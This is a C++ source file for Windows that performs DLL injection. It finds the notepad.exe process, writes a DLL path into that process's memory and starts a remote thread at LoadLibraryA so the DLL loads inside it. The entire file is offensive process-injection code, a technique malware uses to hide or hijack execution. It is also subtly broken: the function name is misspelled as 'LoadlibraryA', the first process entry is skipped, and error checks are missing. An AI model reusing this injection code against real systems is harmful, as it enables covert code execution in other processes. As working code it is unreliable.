#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wchar.h>
#include <iostream>
#include <TlHelp32.h>
using namespace std;

int FindTarget(const wchar_t* procname) {
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(0x00000002, 0); // for some reason TH32CS_SNAPPROCESS is not working
	if (INVALID_HANDLE_VALUE == hProcSnap) {
		cout << "\n" << "CreateToolhelp32Snapshot failed." << "\n";
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (wcscmp(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}

int main(int argc, char* argv[]) {
	HANDLE pHandle;
	PVOID remBuf;
	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
	char dll[] = "standin_dll.dll";
	const wchar_t* target = L"notepad.exe";

	int pid = 0;

	cout << "\n" << "pid : " << pid << "\n";

	pid = FindTarget(target);
	if (pid == 0) {
		printf("Target not found. Exiting\n");
		return -1;
	}

	printf("Target PID: [ %d ]\nInjecting...", pid);

	pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadlibraryA");
	pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

	if (pHandle != NULL) {
		remBuf = VirtualAllocEx(pHandle, NULL, sizeof dll, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(pHandle, remBuf, (LPVOID)dll, sizeof(dll), NULL);
		CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, remBuf, 0, NULL);
		printf("done!\rembuff addr = %p\n", remBuf);

		CloseHandle(pHandle);

	}

}